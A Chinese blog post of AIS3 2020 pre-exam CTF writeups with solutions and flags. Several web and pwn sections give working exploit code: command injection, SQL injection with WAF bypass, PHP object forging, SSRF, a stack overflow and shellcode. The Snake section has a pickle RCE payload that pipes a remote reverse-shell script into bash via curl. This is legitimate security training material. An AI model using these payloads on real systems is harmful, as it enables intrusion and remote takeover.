---
title: AIS3 2020 pre-exam Writeups
date: 2020-06-18 10:37:49
tags:
- ctf
---

![](https://i.imgur.com/AyfQHQv.png)

不知道是不是今年太多大大沒有打
我才能名次比較前面 QQ

不過也不枉費今年認真的練習
在解題的時候明顯有感受到自己的想法跟邏輯非常流暢
但我的 crypto 還是一樣爛

<!-- more -->

---

# Misc

## 💤Piquero

- [braille online](https://www.dcode.fr/braille-alphabet)

- `AIS3{I_feel_sleepy_Good_Night!!!}`

## 🐥Karuego

題目圖片有藏一個 zip 但有加密
發現裡面有張圖片 `files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg`
網路上也有一模一樣的 [3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg](https://pm1.narvii.com/6182/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg)
pkcrack 直接炸開這包 zip
但要注意用 pkcrack 前 需要先將圖片跟 zip 分離

- `AIS3{Ar3_y0u_r34l1y_r34dy_t0_sumnn0n_4_D3m0n?}`

## 🌱Soy

用這個[工具](https://merricx.github.io/qrazybox/)手工把 QR code 大致還原後（右下角一定不能損毀）
點右上角的 `Tools` -> `Extract QR Information` flag 就會出來了
詳細自己啃 QR code 原理

- `AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!}`

## 👿Shichirou

構造一個 link 指向 `../flag.txt`
包成 tar 後送給 server

```python=
from pwn import *

host = '60.250.197.227'
port = 11000
r = remote(host, port)
f = open('a.tar', 'r').read()
l = len(f)
r.sendline(str(l))
r.sendline(f)

print(r.recvline())
```

- `AIS3{Bu223r!!!!_I_c4n_s33_e_v_e_r_y_th1ng!!}`

## 👑Saburo

flag 字母對了回傳的時間會變多
但秒數很漂
每個字母取 10 次的平均
找最大的就是 flag

```python=
from pwn import *
import string

host = '60.250.197.227'
port = 11001

d = string.printable
flag = 'AIS3{'

while True:
	tmp_c = ''
	sec_max = 0

	for c in d:
		c_sec_avg = 0
		for j in range(10):
			r = remote(host, port)
			r.sendline(bytes((flag + c).encode('ascii')))
			try:
				sec = int(r.recvline().decode('ascii').split()[5])
			except:
				print('[OK]', flag+c)
				exit()
			r.close()
			c_sec_avg += sec
		c_sec_avg /= 10
		if c_sec_avg > sec_max:
			tmp_c = c
			sec_max = c_sec_avg
	flag += tmp_c
	print(sec_max, flag)
```

- `AIS3{A1r1ght_U_4r3_my_3n3nnies}`




---

# Crypto

## 🦕 Brontosaurus

檔案打開發現是 jsfuck 但執行卻炸裂
題目敘述 jsfuck 反過來了因此猜測整段文件要 reverse 再執行

PS. 這題貌似以前出過？

- `AIS3{Br0n7Os4uru5_ch3at_3asi1Y}`

## 🦖 T-Rex

查表 感恩

```python=
f = open('prob').readlines()
f = [ i.split() for i in f ]

d = dict()

for i in f[0]:
	d[i] = dict()

for i in range(1, len(f)-1):
	for j in range(1, len(f[i])):
		d[ f[0][j-1] ][ f[i][0] ] = f[i][j]

for i in f[len(f)-1]:
	if len(i) == 1:
		print(i, end='')
	else:
		print(d[i[0]][i[1]], end='')
```

- `AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX}`

## 🐙 Octopus

[QKD BB84](https://zh.wikipedia.org/wiki/%E9%87%8F%E5%AD%90%E5%AF%86%E9%91%B0%E5%88%86%E7%99%BC#BB84%E5%8D%8F%E8%AE%AE)
題目給了溝通兩端的 bias 以及 光子偏振態
我們就假設未被竊聽因此偏振態一樣來解密
按照 wiki 的敘述
相同 bias 且偏振態方向合理才會被採納

```python=
# 0 up
# 1 right
# 2 right up
# 3 right down

f = open('output').readlines()

a_b = [ i for i in eval(f[0].strip()[11:]) ]
b_b = [ i for i in eval(f[3].strip()[11:]) ]
qu = [ i for i in eval(f[1].strip()[11:]) ]
flag = f[5].strip()
qu_direc = list()
bit = ''

for i in qu:
	if i.real == 0:
		qu_direc.append(1)
	elif i.real > 0 and i.imag > 0:
		qu_direc.append(2)
	elif i.real > 0 and i.imag < 0:
		qu_direc.append(3)
	else:
		qu_direc.append(0)

for i in range(1024):
	if a_b[i] == b_b[i]:
		if a_b[i] == '+':
			if qu_direc[i] == 0:
				bit += str(0)
			elif qu_direc[i] == 1:
				bit += str(1)
		elif a_b[i] == 'x':
			if qu_direc[i] == 2:
				bit += str(0)
			elif qu_direc[i] == 3:
				bit += str(1)

flag = hex(int(bit[:400],2) ^ int(flag))
flag = bytes.fromhex(flag[2:]).decode('utf-8')
print(flag)
```

- `AIS3{EveryONe_kn0w_Quan7um_k3Y_Distr1but1on--BB84}`

---

# Reverse

## 🍍TsaiBro

去年也有一樣的題目 XD
超級 basic 的逆向

從 code 中可以發現
`table` 存著字典
照著 index 的順序可以看出轉換的規律
每個字由兩組 `發財` 跟 `.` 構成
第一組 `.` 的規則是 `index // 8 + 1`
第二組 `.` 的規則是 `index % 8 + 1`

```python=
import re

f = open('TsaiBroSaid', encoding='utf-8')

s = r'56789{}_WXY0yzABabcdmnopSTUVGHIJKLMNuvwxefghqrstijklOPQRCDEF1234'
d = dict()

for i in range(len(s)):
	tmp = '發財' + '.' * (i // 8 + 1) + '發財' + '.' * (i % 8 + 1)
	d[tmp] = s[i]

data = re.findall(r'發財\.*發財\.*', f.readlines()[1])

for i in data:
	print(d[i], end='')
```

- `AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3}`

## 🎹Fallen Beat

先說工具
會用到 Jadx JBE(Java Bytecode Editor)

jar 丟進 jadx 看
`PanelEnding.class` 中有 flag 的運算
而這個 `setValue()` 會在 `GameControl.run` 中被 call
把 `total` 跟 `maxCombo` 都 patch 成 `0` 讓等式恆成立

- `AIS3{Wow_how_m4ny_h4nds_do_you_h4ve}`

---

# Web

## 🐿️Squirrel

不小心在 F12 發現 api.php 有 LFI 以 json 的方式
讀取 api.php 得到 src

```php=
<?php

header('Content-Type: application/json');

if ($file = @$_GET['get']) {
    $output = shell_exec("cat '$file'");

    if ($output !== null) {
        echo json_encode([
            'output' => $output
        ]);
    } else {
        echo json_encode([
            'error' => 'cannot get file'
        ]);
    }
} else {
    echo json_encode([
        'error' => 'empty file path'
    ]);
}

```

我們可以發現 \#6 有 command injection
注意有單引號

payload : `https://squirrel.ais3.org/api.php?get=';cat /5qu1rr3l_15_4_k1nd_0f_b16_r47.txt;'`

PS. 這題也跟去年有題好像 XD

- `AIS3{5qu1rr3l_15_4_k1nd_0f_b16_r47}`

## 🐘Elephant

提示說有 src 可以看到處翻都沒有
結果發現有 `.git/`
ok~ dump

接著還原出 index.php 看 src
取重要的部分看

![](https://i.imgur.com/k5RfZsZ.png)

![](https://i.imgur.com/BFHowCl.png)

吐 flag 的地方是用 `strcmp()` 比較的
怎麼可能 md5 之後會等於 flag 根本天方夜譚
那就直接戳爆 `strcmp()` 吧
給他一個 array 他就會回傳 `0` 繞過比較了

然後東西是先序列化再 base64
所以我們就構造一個 token 等於 array 的物件回去當cookie

```php=
<?php
class User {
    public $name;
    private $token;

    function __construct($name, $token) {
        $this->name = $name;
        $this->token = $token;
    }
}

$t = array();
$o = new User('a', $t);
echo base64_encode(serialize($o));
```

- `AIS3{0nly_3l3ph4n75_5h0uld_0wn_1v0ry}`

## 🦈Shark

去年的 [d1v1n6 d33p3r](https://blog.djosix.com/ais3-2019-pre-exam-%E5%AE%98%E6%96%B9%E8%A7%A3%E6%B3%95/#d1v1n6-d33p3r-web-16-solves)

payload : `https://shark.ais3.org/?path=http://172.22.0.2/flag`

- `AIS3{5h4rk5_d0n'7_5w1m_b4ckw4rd5}`

## 🐍Snake

主要是考 python 反序列化
測試發現是 python3

順便構造 inheritance chain 來 get shell
當然也是可以直接讀 flag 就好啦
但 get shell 比較帥

```python=
import pickle, base64

rce = """''.__class__.__mro__[1].__subclasses__()[81].__init__.__globals__['__builtins__']['eval']("__import__('os').system('curl chesskuo.tw/revsh.php|bash')")"""

class A(object):
	def __reduce__(self):
		return (eval, (rce,))

o = A()
print(base64.b64encode(pickle.dumps(o)))
```

- `AIS3{7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.}`

## 🦉Owl

直接猜帳號密碼 有很多組你拿字典撞應該一堆
我直接猜 `user:password` got it~

讀一下 source
發現洞洞是蠻基本的 WAF 繞過

![](https://i.imgur.com/iJjf5DS.png)

可以看到有兩次 `str_ireplace()`
那就把字重複幾遍讓他被過濾後又變成一個字
ex : `UNION` -> `UNIUNIONON`

接著就是基本的猜 union cols
發現為 `3`

接著枚舉 table schema 
[cheat sheets](https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet)

payload : `'///******///UNIUNIUNIONONON///******///SELSELSELECTECTECT///******///1,group_concat(name||':'||value),3///******///FRFRFROMOMOM///******///garbage;///***`

- `AIS3{4_ch1ld_15_4_curly_d1mpl3d_lun471c}`

---

# Pwn

## 👻 BOF

去年的 [bof](https://github.com/yuawn/ais3-2019-pre-exam#bof---139-solves)

```python=
from pwn import *

host = '60.250.197.227'
port = 10000
r = remote(host, port)

sh = 0x00400687
payload = 'a' * 0x30 + p64(sh)

r.recvuntil('ubuntu 18.04.')
r.sendline(payload)
r.interactive()
```

- `AIS3{OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt}`

## 📃 Nonsense

反組譯後得到的 main

![](https://i.imgur.com/diUoQM3.png)

\#15 我們知道他會去檢查一個東西
通過後會將儲存第二個輸入的變數拿去執行

![](https://i.imgur.com/5PCh2Ra.png)

那個 func 其實只是在檢查你的輸入中是否存在一段 `wubbalubbadubdub` 這個字串
而且在檢查期間不能有 `ascii < ' '` 的 byte 出現

那就在檢查字串前塞些 alphanumeric shellcode
再 `jmp` 到 `wubba` 後面的任意 shellcode 即可
注意 jump 的 byte 也是不能是小於空白 ascii 的
稍微填充一下應該不難

```python=
from pwn import *

host = '60.250.197.227'
port = 10001

r = remote(host, port)

s = b'wubbalubbadubdub'
sc = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

payload = b'TX4HPZTAZAYVH92'
payload += b'u' + b'\x20'
payload += s + s + sc

r.recvuntil(b'name?')
r.sendline(b'a')

r.recvuntil(b'yours?')
r.sendline(payload)

r.interactive()
```

- `AIS3{Y0U_5peAk_$helL_codE_7hat_iS_CARzy!!!}`
